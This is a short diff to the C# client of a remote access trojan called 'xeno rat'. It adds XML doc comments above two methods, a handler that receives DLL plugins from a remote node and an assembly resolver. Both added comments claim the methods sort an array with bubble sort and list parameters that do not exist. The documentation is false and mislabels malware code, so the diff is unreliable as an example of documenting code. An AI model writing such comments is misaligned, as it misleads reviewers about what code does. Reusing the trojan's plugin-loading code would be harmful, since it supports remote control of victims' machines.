@@ -18,6 +18,12 @@ namespace xeno_rat_client
 
         public Dictionary<string, Assembly> Assemblies = new Dictionary<string, Assembly>();
         public string classpath = "Plugin.Main";
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task DllNodeHandler(Node subServer)
         {
             byte[] getdll = new byte[] { 1 };
@@ -52,6 +58,12 @@ namespace xeno_rat_client
                 Console.WriteLine(e.StackTrace);
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
         {
             if (new AssemblyName(args.Name).Name == "xeno rat client")
